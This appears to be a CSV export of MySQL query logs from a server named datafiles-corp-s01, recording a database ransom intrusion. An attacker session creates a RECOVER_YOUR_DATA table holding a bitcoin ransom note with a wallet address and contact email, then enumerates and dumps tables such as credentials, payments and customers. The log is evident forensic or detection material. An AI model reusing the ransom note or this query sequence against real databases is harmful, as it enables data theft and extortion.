TimeGenerated,DeviceName,ActionType,Query,RawData
"Sep 1, 2026 4:27:55 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:55.379368Z    56 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:55 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:55.285963Z    56 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:55 PM",datafiles-corp-s01,Query, SELECT * FROM `film`,2026-09-01T20:27:55.474550Z    56 Query SELECT * FROM `film`
"Sep 1, 2026 4:27:54 PM",datafiles-corp-s01,Query, SELECT * FROM `customer_list`,2026-09-01T20:27:54.614035Z    55 Query SELECT * FROM `customer_list`
"Sep 1, 2026 4:27:54 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:54.519427Z    55 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:54 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:54.425428Z    55 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:52.913123Z    53 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:53.634232Z    54 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query, SELECT * FROM `country`,2026-09-01T20:27:53.006348Z    53 Query SELECT * FROM `country`
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query, SELECT * FROM `customer`,2026-09-01T20:27:53.726104Z    54 Query SELECT * FROM `customer`
"Sep 1, 2026 4:27:53 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:53.542383Z    54 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:52.047153Z    52 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:52.819212Z    53 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query, SELECT * FROM `city`,2026-09-01T20:27:52.231012Z    52 Query SELECT * FROM `city`
"Sep 1, 2026 4:27:52 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:52.138773Z    52 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:51 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:51.359675Z    51 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:51 PM",datafiles-corp-s01,Query, SELECT * FROM `category`,2026-09-01T20:27:51.552816Z    51 Query SELECT * FROM `category`
"Sep 1, 2026 4:27:51 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:51.454330Z    51 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:50 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:50.438262Z    50 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:50 PM",datafiles-corp-s01,Query, SELECT * FROM `address`,2026-09-01T20:27:50.633878Z    50 Query SELECT * FROM `address`
"Sep 1, 2026 4:27:50 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:50.533426Z    50 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:49 PM",datafiles-corp-s01,Query, SELECT * FROM `actor_info`,2026-09-01T20:27:49.225914Z    49 Query SELECT * FROM `actor_info`
"Sep 1, 2026 4:27:49 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:49.130332Z    49 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:49 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:49.036619Z    49 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:48.427896Z    48 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query, SELECT * FROM `actor`,2026-09-01T20:27:48.521688Z    48 Query SELECT * FROM `actor`
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:27:47.881611Z    47 Query SHOW tables
"Sep 1, 2026 4:27:48 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:48.336507Z    48 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:47.605237Z    47 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:47.118286Z    46 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:47.025581Z    46 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila',2026-09-01T20:27:47.695861Z    47 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila'
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, SELECT * FROM `recover_your_data`,2026-09-01T20:27:47.213022Z    46 Query SELECT * FROM `recover_your_data`
"Sep 1, 2026 4:27:47 PM",datafiles-corp-s01,Query, USE `sakila`,2026-09-01T20:27:47.790275Z    47 Query USE `sakila`
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:27:46.569794Z    45 Query SHOW tables
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data',2026-09-01T20:27:46.379780Z    45 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data'
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:46.287275Z    45 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, USE `recover_your_data`,2026-09-01T20:27:46.477358Z    45 Query USE `recover_your_data`
"Sep 1, 2026 4:27:46 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:45.916287Z    44 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:45 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:45.143207Z    42 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:45 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:45.545402Z    43 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:44 PM",datafiles-corp-s01,Query, SELECT * FROM `payments`,2026-09-01T20:27:44.470631Z    41 Query SELECT * FROM `payments`
"Sep 1, 2026 4:27:44 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:44.367018Z    41 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:44 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:44.273853Z    41 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:43 PM",datafiles-corp-s01,Query, SELECT * FROM `orders`,2026-09-01T20:27:43.601113Z    40 Query SELECT * FROM `orders`
"Sep 1, 2026 4:27:43 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:43.413116Z    40 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:43 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:43.506521Z    40 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:42 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:42.451796Z    39 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:42 PM",datafiles-corp-s01,Query, SELECT * FROM `customers`,2026-09-01T20:27:42.642814Z    39 Query SELECT * FROM `customers`
"Sep 1, 2026 4:27:42 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:42.546361Z    39 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'cr_corp_01',2026-09-01T20:27:40.943358Z    37 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'cr_corp_01'
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SELECT * FROM `credentials`,2026-09-01T20:27:41.839780Z    38 Query SELECT * FROM `credentials`
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:41.743902Z    38 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:41.646302Z    38 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:27:41.127868Z    37 Query SHOW tables
"Sep 1, 2026 4:27:41 PM",datafiles-corp-s01,Query, USE `cr_corp_01`,2026-09-01T20:27:41.037515Z    37 Query USE `cr_corp_01`
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query," GRANT CREATE, DROP ON *.* TO `root`@`%`","2026-09-01T20:27:40.478053Z    36 Query GRANT CREATE, DROP ON *.* TO `root`@`%`"
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:39.919017Z    35 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:40.851643Z    37 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:40.378926Z    36 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:40 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T20:27:40.009963Z    35 Query SHOW DATABASES
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-09-01T20:27:39.367631Z    34 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:27:38.864502Z    34 Query COMMIT
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, USE RECOVER_YOUR_DATA,2026-09-01T20:27:38.954868Z    34 Query USE RECOVER_YOUR_DATA
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:27:39.551659Z    34 Query COMMIT
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1'),2026-09-01T20:27:39.461168Z    34 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1')
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-09-01T20:27:39.140054Z    34 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:27:39.276288Z    34 Query COMMIT
"Sep 1, 2026 4:27:39 PM",datafiles-corp-s01,Query, SHOW TABLES,2026-09-01T20:27:39.045898Z    34 Query SHOW TABLES
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-01T20:27:38.761611Z    34 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:38.199073Z    33 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T20:27:38.290404Z    33 Query SHOW DATABASES
"Sep 1, 2026 4:27:38 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:38.670759Z    34 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:37 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:37.822594Z    32 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:32 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:32.179035Z    30 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:54:04 AM",datafiles-corp-s01,Query, CREATE USER 'root'@'%' IDENTIFIED BY <secret>,2026-09-01T15:54:04.618169Z    21 Query CREATE USER 'root'@'%' IDENTIFIED BY <secret>
"Sep 1, 2026 11:54:04 AM",datafiles-corp-s01,Query, FLUSH PRIVILEGES,2026-09-01T15:54:04.676842Z    21 Query FLUSH PRIVILEGES
"Sep 1, 2026 11:54:04 AM",datafiles-corp-s01,Query, GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION,2026-09-01T15:54:04.666974Z    21 Query GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show variables,2026-09-01T15:53:54.232004Z    21 Query show variables
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show charset,2026-09-01T15:53:54.229863Z    21 Query show charset
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'interactive_timeout',2026-09-01T15:53:54.247687Z    21 Query SHOW SESSION VARIABLES LIKE 'interactive_timeout'
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show engines,2026-09-01T15:53:54.229546Z    21 Query show engines
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, show collation,2026-09-01T15:53:54.230347Z    21 Query show collation
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T15:53:54.227598Z    20 Query SHOW DATABASES
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'version_compile_os',2026-09-01T15:53:54.233652Z    21 Query SHOW SESSION VARIABLES LIKE 'version_compile_os'
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'wait_timeout',2026-09-01T15:53:54.246477Z    21 Query SHOW SESSION VARIABLES LIKE 'wait_timeout'
"Sep 1, 2026 11:53:54 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'offline_mode',2026-09-01T15:53:54.234634Z    21 Query SHOW SESSION VARIABLES LIKE 'offline_mode'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION STATUS LIKE 'Ssl_cipher',2026-09-01T15:53:53.842128Z    20 Query SHOW SESSION STATUS LIKE 'Ssl_cipher'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT current_user(),2026-09-01T15:53:53.835649Z    20 Query SELECT current_user()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION STATUS LIKE 'Ssl_cipher',2026-09-01T15:53:53.875529Z    21 Query SHOW SESSION STATUS LIKE 'Ssl_cipher'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET SQL_SAFE_UPDATES=1,2026-09-01T15:53:53.872418Z    21 Query SET SQL_SAFE_UPDATES=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, show character set where charset = 'utf8mb4',2026-09-01T15:53:53.840544Z    20 Query show character set where charset = 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT CONNECTION_ID(),2026-09-01T15:53:53.840364Z    20 Query SELECT CONNECTION_ID()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'version',2026-09-01T15:53:53.894090Z    21 Query SHOW SESSION VARIABLES LIKE 'version'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT current_user(),2026-09-01T15:53:53.895758Z    21 Query SELECT current_user()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES utf8,2026-09-01T15:53:53.872010Z    21 Query SET NAMES utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT current_user(),2026-09-01T15:53:53.849066Z    21 Query SELECT current_user()
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'lower_case_table_names',2026-09-01T15:53:53.895944Z    21 Query SHOW SESSION VARIABLES LIKE 'lower_case_table_names'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'version_comment',2026-09-01T15:53:53.892641Z    21 Query SHOW SESSION VARIABLES LIKE 'version_comment'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'sql_mode',2026-09-01T15:53:53.876892Z    21 Query SHOW SESSION VARIABLES LIKE 'sql_mode'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES 'utf8mb4',2026-09-01T15:53:53.841269Z    20 Query SET NAMES 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES utf8,2026-09-01T15:53:53.837120Z    20 Query SET NAMES utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET NAMES 'utf8mb4',2026-09-01T15:53:53.875310Z    21 Query SET NAMES 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.848846Z    21 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.834729Z    20 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET CHARACTER SET utf8,2026-09-01T15:53:53.836921Z    20 Query SET CHARACTER SET utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, show character set where charset = 'utf8mb4',2026-09-01T15:53:53.872878Z    21 Query show character set where charset = 'utf8mb4'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.843192Z    20 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SET CHARACTER SET utf8,2026-09-01T15:53:53.849252Z    21 Query SET CHARACTER SET utf8
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SHOW SESSION VARIABLES LIKE 'sql_mode',2026-09-01T15:53:53.837481Z    20 Query SHOW SESSION VARIABLES LIKE 'sql_mode'
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, set autocommit=1,2026-09-01T15:53:53.876683Z    21 Query set autocommit=1
"Sep 1, 2026 11:53:53 AM",datafiles-corp-s01,Query, SELECT CONNECTION_ID(),2026-09-01T15:53:53.872635Z    21 Query SELECT CONNECTION_ID()
